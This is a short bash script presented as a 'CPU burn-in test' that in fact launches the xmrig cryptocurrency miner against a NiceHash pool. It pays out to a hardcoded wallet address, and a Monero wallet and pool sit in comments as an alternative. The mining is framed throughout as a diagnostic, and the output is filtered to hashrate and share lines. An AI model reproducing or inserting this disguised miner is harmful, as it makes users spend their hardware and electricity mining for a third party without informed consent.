#!/bin/bash

mag=$'\e[1;35m'
cyn=$'\e[1;36m'
white=$'\e[0m'

#variables
#Nicehash version:
username="15ufDkou9LJrdWTizkVTkAeXTfFC7HT13t.cputest$RANDOM"
url="cryptonightr.usa-new.nicehash.com:3375"
#Private monero pool:
#username="45ynYARcmKcLZrB1kEfjsbCcGByjVqsCnhzAgLpN1xjnTzxRRp8F7tq3bXbnrW929mdRcyBSAHNTzjHap4Wgbc8FTWRaut9"
#url="pool.supportxmr.com:5555"

echo $cyn $username $white
#echo $cyn $url $white
echo $mag Burn in progress... $white


#Execute CPU burn-in test
#./xmrig --algo="cn/r" --url=$url --user=$username --pass="x" --asm=auto --nicehash --donate-level=40 --print-time=500
./xmrig --algo="cn/r" --url=$url --user=$username --pass="x" --asm=auto --nicehash --donate-level=40 --print-time=500 | egrep 'accepted|speed|(CPU.*AES)|esume|reject'
#./xmrig --algo=cn/r --url=$url --user=$username --pass="cputest$RANDOM" --asm=auto --keepalive --donate-level=40 --print-time=500 | egrep 'accepted|speed|(CPU.*AES)|esume|reject'
